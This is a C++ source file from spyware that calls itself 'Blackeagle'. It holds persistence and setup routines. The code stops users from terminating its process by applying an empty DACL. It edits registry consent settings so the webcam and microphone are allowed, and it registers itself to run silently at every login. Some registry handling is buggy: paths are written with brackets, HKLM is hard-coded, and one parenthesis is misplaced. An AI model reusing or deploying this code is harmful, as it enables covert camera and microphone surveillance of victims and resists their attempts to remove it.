#include "MakePersist.h"

LPVOID install(BOOL reg) {
	// Singleton
	CreateMutexA(0, FALSE, "Local\\$blackeagle$"); // Try to create a named mutex
	if (GetLastError() == ERROR_ALREADY_EXISTS) // Does the mutex already exist?
		exit(EXIT_FAILURE); // quit; mutex is released automatically

	// Process is allowed to be killed only by administrators.
	ProtectProcess();

	// Create deafult data folder if not exists already
	CreateDirectory(stringToWString(DATA_FOLDER_PATH).c_str(), NULL);

	if (!reg)
		return NULL;

	LPCWSTR regPath;
	LPCWSTR regName;
	LPCWSTR regValue;

	// Enable Camera
	regPath = L"[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\webcam]";
	regName = L"\"Value\"";
	regValue = L"\"Allow\"";
	createKey(regPath, (LPWSTR)regName, (LPWSTR)regValue);

	// Enable Microphone
	regPath = L"[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone]";
	createKey(regPath, (LPWSTR)regName, (LPWSTR)regValue);

	// Enable run at login
	regPath = L"[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]";
	regName = L"Blackeagle";
	regValue = L"\"C:\\Program Files(x86)\\blackeagle\\Blackeagle - spyware.exe\" -silent";
	createKey(regPath, (LPWSTR)regName, (LPWSTR)regValue);

	// TODO 
	// Enable scheduler
	return NULL;
}

DWORD createKey(LPCWSTR registryPath, LPWSTR registryName, LPWSTR value)
{
	HKEY hKey;
	DWORD lpdwDisposition;
	DWORD err = 0;

	// Create key or open if exists
	if (RegCreateKeyEx(HKEY_LOCAL_MACHINE, registryPath, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, &lpdwDisposition))
		err = GetLastError();

	// Set the corresponding value for the key
	if (RegSetValueEx(hKey, registryName, 0, REG_SZ, (BYTE*)value, (wcslen(value) * sizeof(wchar_t)) != ERROR_SUCCESS))
		err = GetLastError();
	RegCloseKey(hKey);

	return err;
}

DWORD ProtectProcess(void)
{
	HANDLE hProcess = GetCurrentProcess();
	PACL pEmptyDacl;
	DWORD dwErr;

	// using malloc guarantees proper alignment
	pEmptyDacl = (PACL)malloc(sizeof(ACL));

	if (!InitializeAcl(pEmptyDacl, sizeof(ACL), ACL_REVISION))
		dwErr = GetLastError();
	else
		dwErr = SetSecurityInfo(hProcess, SE_KERNEL_OBJECT,
			DACL_SECURITY_INFORMATION, NULL, NULL, pEmptyDacl, NULL);

	free(pEmptyDacl);
	return dwErr;
}
